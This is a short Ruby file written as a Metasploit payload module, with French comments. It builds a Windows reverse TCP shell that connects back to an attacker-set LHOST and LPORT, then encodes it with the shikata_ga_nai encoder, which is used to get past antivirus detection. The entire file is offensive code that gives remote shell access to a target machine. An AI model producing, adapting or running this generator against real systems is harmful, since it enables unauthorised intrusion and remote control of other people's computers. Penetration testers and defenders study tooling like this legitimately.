#!/usr/bin/env ruby   # Shebang : indique que ce fichier est interprété par Ruby

require 'msf/core'    # Charge le cœur du framework Metasploit

# Définition du module
class MetasploitModule < Msf::Payload::Single
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Payload Generator',
      'Description'    => %q{
        Generates a custom reverse shell payload and encodes it using x86/shikata_ga_nai.
      },
      'Author'         => ['benbet21cyber'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',        # Plateforme cible (Windows ici)
      'Arch'           => ARCH_X86,     # Architecture (x86)
      'Payload'        => {
        'Offsets' => {},
        'Payload' => ''                 # Le payload sera généré dynamiquement
      }
    ))

    # Options configurables
    register_options(
      [
        OptAddress.new('LHOST', [true, 'Local IP address for reverse shell']), # IP locale
        OptInt.new('LPORT', [true, 'Local port for reverse shell', 4444])      # Port local
      ]
    )
  end

  # Méthode principale exécutée avec "run"
  def generate
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    print_status("Generating payload with encoding: x86/shikata_ga_nai")

    # Exemple : création d’un payload reverse_tcp
    raw_payload = framework.payloads.create('windows/shell/reverse_tcp')
    raw_payload.datastore['LHOST'] = lhost
    raw_payload.datastore['LPORT'] = lport

    # Encodage du payload avec shikata_ga_nai
    encoded_payload = raw_payload.generate_simple(
      'Encoder'   => 'x86/shikata_ga_nai',
      'Iterations'=> 1
    )

    print_good("Generated encoded payload: #{encoded_payload.inspect}")

    return encoded_payload
  end
end
